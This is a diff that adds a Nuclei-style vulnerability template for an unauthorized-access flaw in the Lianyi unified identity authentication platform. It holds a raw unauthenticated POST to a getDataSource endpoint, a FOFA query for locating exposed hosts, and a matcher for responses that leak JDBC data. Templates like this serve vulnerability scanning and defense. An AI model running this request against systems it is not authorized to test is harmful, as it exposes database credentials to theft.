@@ -1,0 +1,25 @@
+id: lianyi-getDataSource-infoleak
+
+info:
+  name: 联奕统一身份认证平台-未授权访问-getDataSource
+  author: HuanXiong
+  severity: high
+  metadata: 
+    fofa-query: icon_hash="772658742"
+
+  tags: Unauthorized
+
+http:
+  - raw:
+      - |
+        POST /api/bd-mdp/serviceManager/outInterface/getDataSource HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) 
+        Accept-Charset: utf-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"jdbc")'
